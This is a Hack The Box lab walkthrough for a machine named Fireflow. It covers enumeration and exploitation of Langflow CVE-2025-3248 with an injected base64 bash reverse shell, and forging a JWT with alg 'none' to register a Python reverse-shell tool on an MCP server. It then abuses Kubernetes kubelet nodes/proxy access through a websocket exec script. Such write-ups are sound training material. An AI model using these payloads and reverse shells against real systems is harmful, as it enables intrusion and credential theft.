#medium #htb #subdomains #langflow #cve-2025-3248 #rce #openapi #api #env-leak #mcp #jwt #kubernetes #kubelet #rbac
# Enumeration
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ sudo nmap -p- --open -vvv --min-rate 5000 -n -Pn 10.129.32.28 -oG scan 
Discovered open port 22/tcp on 10.129.32.28
Discovered open port 443/tcp on 10.129.32.28
```

Ports 22 and 443 are open.
```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ nmap -p 22,443 -sCV 10.129.32.28 -oN portscan.txt -Pn
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
443/tcp open  ssl/http nginx
```

## Subdomains

Use `ffuf` to enumerate subdomains.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.fireflow.htb" -fw 4 -u http://10.129.32.28
flow.fireflow.htb            [Status: 200, Size: 950]
```

Add `fireflow.htb` and `flow.fireflow.htb` to `/etc/hosts`.
```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ echo "10.129.32.28 fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts
```

## Directories

Fuzz directories on `flow.fireflow.htb`.
```bash
[hvidal@fedora] ~/d/h/h/m/f/scan
❯ ffuf -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u https://flow.fireflow.htb/FUZZ -fw 132 -o flow.fireflow-dirs.txt
docs                    [Status: 200, Size: 1007]
health                  [Status: 200, Size: 15]
logs                    [Status: 403, Size: 51]
redoc                   [Status: 200, Size: 889]
```

## API

`flow.fireflow.htb/docs` didn't display anything, but checking the source code we can see that **Swagger UI** is trying to render `flow.fireflow.htb/openapi.json`, which describes the API.

Download it and open it in [Swagger Editor](https://editor.swagger.io/)

```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ wget --no-check-certificate https://flow.fireflow.htb/openapi.json
```

We found that the endpoint `/api/v1/build_public_tmp/{flow_id}/flow` doesn't require authentication and is vulnerable to [CVE-2025-3248](https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx).

# Exploitation

The `build_public_tmp` endpoint prepares a public flow for execution without requiring authentication.
The issue is that the endpoint accepts not only the flow stored on the server, but also the `data` in the request body, which can be used to inject malicious code instead of executing the public flow stored on the server.

## Finding a public flow

First we need to find a public flow:
- In `https://fireflow.htb` we can find that the flow `7d84d636` is public, which is the same as the flow that opens when clicking the `Open Agent` button
- Flow ID: `flow.fireflow.htb/playground/{flow_id}`.

To check if that flow is public we can use the `/api/v1/flows/public_flow/{flow_id}` endpoint.

>[!Note]
>You will have to use the client_id cookie for both requests.

```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -k -X GET 'https://flow.fireflow.htb/api/v1/flows/public_flow/7d84d636-af65-42e4-ac38-26e867052c25' -b "client_id=84df2057-4dbc-4143-8d7c-f0aab75422ce"
```

If it returns a `json` response, the flow is public.

## Injecting malicious code

Now we can send a request to `/api/v1/build_public_tmp/{flow_id}/flow` containing a component with a reverse shell.

The reverse shell will be `base64-encoded`:
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODAvNDQ0NCAwPiYxCg==
```

Payload: 
```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xODAvNDQ0NCAwPiYxCg== | base64 -d | bash
```

First, save the data in a `.json` file (change the payload in the value section).

>[!info]- data.json
>```json
>{
>  "data": {
>    "nodes": [{
>      "id": "Exploit-001",
>      "type": "genericNode",
>      "position": {"x":0,"y":0},
>      "data": {
>        "id": "Exploit-001",
>        "type": "ExploitComp",
>        "node": {
>          "template": {
>            "code": {
>              "type": "code",
>              "required": true,
>              "show": true,
>              "multiline": true,
>              "value": "import os, socket, json as _json\n\n_proof = os.system(\"echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjE4MC80NDQ0IDA+JjEK | base64 -d | bash\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
>              "name": "code",
>              "password": false,
>              "advanced": false,
>              "dynamic": false
>            },
>            "_type": "Component"
>          },
>          "description": "X",
>          "base_classes": ["Data"],
>          "display_name": "ExploitComp",
>          "name": "ExploitComp",
>          "frozen": false,
>          "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
>          "field_order": ["code"],
>          "beta": false,
>          "edited": false
>        }
>      }
>    }],
>    "edges": []
>  },
>  "inputs": null
>}
>```

Start a listener.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ nc -lnvp 4444
```

Send the request to the endpoint.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -k -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \                                      
        -H "Content-Type: application/json" \
        -b "client_id=84df2057-4dbc-4143-8d7c-f0aab75422ce" \
        -d @data.json
```

## Pivoting

Now we have a shell as `www-data` but checking the environment variables, we found the password for the user `nightfall`.

```bash
www-data@fireflow:/var/lib/langflow$ env
...
LANGFLOW_SUPERUSER_PASSWORD=*******
...
```

Now we can connect via SSH and claim the `user.txt` flag.

```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ ssh nightfall@fireflow.htb
nightfall@fireflow:~$ cat user.txt
```

# Privilege escalation
## MCP server

### Enumeration

We found a MCP configuration file in `/home/nightfall/.mcp`, which contains sensitive data.
```json
nightfall@fireflow:~/.mcp$ cat config.json 
{
  "server": "http://10.129.35.121:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

The port isn't exposed, so we forwarded the port locally.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ ssh -L 30080:localhost:30080 nightfall@fireflow.htb 
```

Now we check the version and endpoints of the API.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl http://localhost:30080/api/v1/version
{"version":"0.1.0","auth":{"type":"JWT","header":"Authorization: Bearer <token>","supported_algorithms":["HS256","none"]},"docs":"/docs","endpoints":["POST /mcp [MCP JSON-RPC 2.0]","POST /api/v1/auth","GET  /api/v1/tools","POST /api/v1/tools [admin]"]}
```

The supported `none` algorithm is vulnerable to JWT forgery. 
Also the API exposes:
- `/docs`
- `/mcp`
- `/api/v1/auth`
- `/api/v1/tools`

Download the `openapi.json` file and open it in [Swagger Editor](https://editor.swagger.io/) to explore the API.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ wget http://localhost:30080/openapi.json
```

### JWT exploitation

First, obtain a JWT from the `/api/v1/auth` endpoint.

```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -X POST http://localhost:30080/api/v1/auth \
      -H "Content-Type: application/json" \
      -d '{
           "username": "langflow-bot",
           "password": "Langfl0w@mcp2026!"
  }'
  
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
```

A POST request to the endpoint `/api/v1/tools` allows us to create a new tool containing arbitrary Python code, but we must have the **admin role** to add a new tool.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ JWT=<access_token>

[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -X POST http://localhost:30080/api/v1/tools \
        -H "Authorization: Bearer $JWT" \
        -H "Content-Type: application/json" \
        -d '{
      "name": "test",
      "description": "test",
      "code": "print(\\"hello\\")"
  }'
{"detail":"Admin role required"}
```

In [jwt.io](https://www.jwt.io/) we can decode and modify the JWT.
Decoded JWT:
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "sub": "langflow-bot",
  "role": "user"
}
```

Change the role to admin because the application supports the none algorithm.
```json
{
  "alg": "none",
  "typ": "JWT"
}
{
  "sub": "langflow-bot",
  "role": "admin"
}
```

Now we can create a new tool using a Python reverse shell.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -X POST http://localhost:30080/api/v1/tools \
        -H "Authorization: Bearer $JWT" \
        -H "Content-Type: application/json" \
        -d '{
      "name": "test",
      "description": "test",
      "code": "import socket,os,pty\\npid=os.fork()\\nif pid>0:\\n    import sys;sys.exit(0)\\nos.setsid()\\npid=os.fork()\\nif pid>0:\\n    import sys;sys.exit(0)\\ns=socket.socket()\\ns.connect((\\"10.10.14.180\\",4444))\\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\\npty.spawn(\\"/bin/sh\\")"
  }'
{"status":"registered","name":"test"}
```

Start a listener.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ nc -lnvp 4444
```

Execute the tool via the `/mcp` endpoint.
```bash
[hvidal@fedora] ~/d/h/h/m/f/content
❯ curl -X POST http://localhost:30080/mcp \
        -H "Authorization: Bearer $JWT" \
        -H "Content-Type: application/json" \
        -d '{
      "method": "tools/call",
      "params": {
        "name": "test",
        "arguments": {}
      }
    }'
```

## Kubernetes
### Enumeration

The IP of the [[Kubernetes]] API is exposed in the environment variables.
```bash
$ env
KUBERNETES_PORT=tcp://10.43.0.1:443
```

Check the token's permissions.
```bash
$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
$ curl -X POST -k -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews  -d '{"apiVersion": "authorization.k8s.io/v1", "kind": "SelfSubjectRulesReview",  "spec": { "namespace": "default" } }'

"resourceRules":
  {
	"verbs": [
	  "get"
	],
	"resources": [
	  "nodes/proxy"
	]
  }, ...
```

The `nodes/proxy` resource is dangerous.

### Exploitation

List all the pods exposed by the kubelet:
```bash
curl -k -H "Authorization: Bearer $TOKEN" https://10.129.36.164:10250/pods
```

Paste the `json` data in a `json` formatter.
We found that one Pod has the host `/root` directory mounted.
```json
...
"mountPath":"/host/root",
...
```

To execute commands in the Pod we have to use WebSockets.
Use the following Python script.

>[!info]- Script.py
>```python
>#!/usr/bin/env python3
>import asyncio, ssl, sys, websockets
>
>NODE     = "10.129.36.164"
>NE_NS    = "monitoring"
>NE_POD   = "prometheus-prometheus-node-exporter-nmntq"
>NE_CNT   = "node-exporter"
>TOKEN    = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
> COMMAND  = sys.argv[1] if len(sys.argv) > 1 else 'id'
>
>async def ws_exec(cmd_parts):
>    ctx = ssl.create_default_context()
>    ctx.check_hostname = False
>    ctx.verify_mode    = ssl.CERT_NONE
>
>    args = "&".join(f"command={part}" for part in cmd_parts)
>    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
>            f"?output=1&error=1&{args}")
>
>    async with websockets.connect(
>        url, ssl=ctx,
>        additional_headers={"Authorization": f"Bearer {TOKEN}"},
>        subprotocols=["v4.channel.k8s.io"],
>        open_timeout=10
>    ) as ws:
>        try:
>            while True:
>                data = await asyncio.wait_for(ws.recv(), timeout=5)
>                if isinstance(data, bytes) and len(data) > 1:
>                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
>                    sys.stdout.flush()
>        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
>            pass
>
>asyncio.run(ws_exec(COMMAND.split()))
>```

Read the root flag.
```bash
$ python script.py "cat /host/root/root/root.txt"
```
